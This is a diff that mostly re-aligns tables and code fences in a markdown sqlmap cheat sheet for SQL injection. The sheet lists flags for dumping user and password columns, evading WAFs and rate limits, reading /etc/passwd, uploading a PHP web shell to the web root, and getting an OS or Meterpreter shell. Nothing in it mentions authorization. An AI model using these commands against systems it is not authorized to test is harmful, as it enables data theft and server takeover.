@@ -123,11 +123,11 @@ sqlmap -r request.txt -D <db_name> -T <table_name> --dump --batch
 
 #### 2. Authentication & Sessions
 
-| Goal        | Flag                                          |
-| ----------- | --------------------------------------------- |
-| Cookies     | --cookie="PHPSESSID=12345"                    |
-| Headers     | -H "X-Forwarded-For: 127.0.0.1"               |
-| Login Creds | --auth-type Basic --auth-cred "user:pass"     |
+| Goal        | Flag                                      |
+| ----------- | ----------------------------------------- |
+| Cookies     | --cookie="PHPSESSID=12345"                |
+| Headers     | -H "X-Forwarded-For: 127.0.0.1"           |
+| Login Creds | --auth-type Basic --auth-cred "user:pass" |
 
 #### 🛡️ 3. Bypassing Firewalls (WAF)
 
@@ -215,12 +215,12 @@ sqlmap -u "http://site.com/" --user-agent="MyBrowser*" --dbs
 
 Once you've found the tables, you don't always need to dump the entire database.
 
-| Goal                    | Command                                      |
-| ----------------------- | -------------------------------------------- |
-| Dump Specific Columns   | -D db -T users -C "user,password" --dump     |
-| Dump First 5 Rows       | --start 1 --stop 5                           |
-| Search for Table Names  | --search -T "admin"                          |
-| Search for Column Names | --search -C "pass"                           |
+| Goal                    | Command                                  |
+| ----------------------- | ---------------------------------------- |
+| Dump Specific Columns   | -D db -T users -C "user,password" --dump |
+| Dump First 5 Rows       | --start 1 --stop 5                       |
+| Search for Table Names  | --search -T "admin"                      |
+| Search for Column Names | --search -C "pass"                       |
 
 ##### 🚀 The "Panic" Command
 
@@ -243,8 +243,8 @@ sqlmap -u [URL] --level=5 --risk=3
 
 Use a Tamper Script: The WAF might be blocking standard payloads. Try
 
-``` bash
---tamper=space2comment.
+```bash
+--tamper=space2comment
 ```
 
 Check the Cookie: Your session might have expired. Refresh your browser and copy
@@ -253,27 +253,26 @@ the new cookie.
 ❌ Error: "Connection timed out" or "403 Forbidden" Add a Delay: The server
 might have rate-limiting. Use
 
-``` bash
+```bash
 --delay=1
 
 or
 
---delay=2.
+--delay=2
 ```
 
 Change User-Agent: Use
 
-``` bash
+```bash
 --random-agent
 ```
 
-Some sites block the default User-Agent:
-sqlmap.
+Some sites block the default User-Agent: sqlmap.
 
 Use a Proxy: Your IP might be temporarily soft-blocked. Use
 
-``` bash
---proxy.
+```bash
+--proxy
 ```
 
 ❌ Error: "Internal Server Error (500)" This often means the SQL injection is
@@ -285,12 +284,12 @@ payloads cleaner: --dbms=mysql (or postgresql, mssql).
 If the database user has high privileges (like 'root' or 'sa'), you can go
 beyond data theft.
 
-| Command                                               | Action                                                       |
-| ------------------------------------------------------|--------------------------------------------------------------|
-| --file-read="/etc/passwd"                             |  Read a system file from the server.                         |
-| --file-write="shell.php" --file-dest="/var/www/html/" | Upload a file to the  web directory                          |
-|  --os-shell                                           | Attempt to gain an interactive command prompt.               |
-| --os-pwn                                              | Attempt to spawn a Meterpreter shell (requires Metasploit).  |
+| Command                                               | Action                                                      |
+| ----------------------------------------------------- | ----------------------------------------------------------- |
+| --file-read="/etc/passwd"                             | Read a system file from the server.                         |
+| --file-write="shell.php" --file-dest="/var/www/html/" | Upload a file to the web directory                          |
+| --os-shell                                            | Attempt to gain an interactive command prompt.              |
+| --os-pwn                                              | Attempt to spawn a Meterpreter shell (requires Metasploit). |
 
 #### 📋 The "Complete Checklist" One-Liner
 
@@ -370,8 +369,8 @@ alarm.
 --dbs
 ```
 
-The Objective: This is the action flag.
-It tells SQLMap: "If you find a hole, don't just stop—list all the database names you can find."
+The Objective: This is the action flag. It tells SQLMap: "If you find a hole,
+don't just stop—list all the database names you can find."
 
 | Flag           | Category   | Purpose                          |
 | -------------- | ---------- | -------------------------------- |
